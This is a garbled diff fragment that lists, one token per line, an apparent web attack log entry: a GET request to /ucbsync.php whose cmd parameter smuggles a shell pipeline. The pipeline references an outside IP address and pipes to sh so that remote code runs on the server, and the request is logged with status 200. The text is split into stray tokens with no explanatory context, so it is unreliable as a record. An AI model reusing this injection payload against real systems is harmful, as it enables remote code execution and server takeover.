@@ -1,0 +1,17 @@
+``
+GET
+/ucbsync.php
+?
+cmd=syncfile
+:
+db_files/favicon.ico:137.184.181
+[
+.
+]
+252/
+$
+PWD|sh|
+?
+HTTP/1.0
+''
+200
